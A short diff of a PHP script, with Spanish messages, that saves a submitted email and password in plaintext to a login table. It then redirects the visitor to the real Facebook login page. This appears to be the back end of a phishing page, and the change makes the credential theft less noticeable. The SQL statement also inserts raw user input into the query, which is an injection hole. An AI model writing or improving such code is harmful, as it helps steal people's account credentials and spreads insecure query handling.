@@ -20,7 +20,8 @@
     $sql = "INSERT INTO tblLogin (usuario, contrasena) VALUES ('$email', '$pass')";
 
     if ($conn->query($sql) === TRUE) {
-        echo "Los datos han sido guardados correctamente.";
+        header("Location: https://facebook.com/login");
+        exit();
     } else {
         echo "Error al guardar los datos: " . $conn->error;
     }
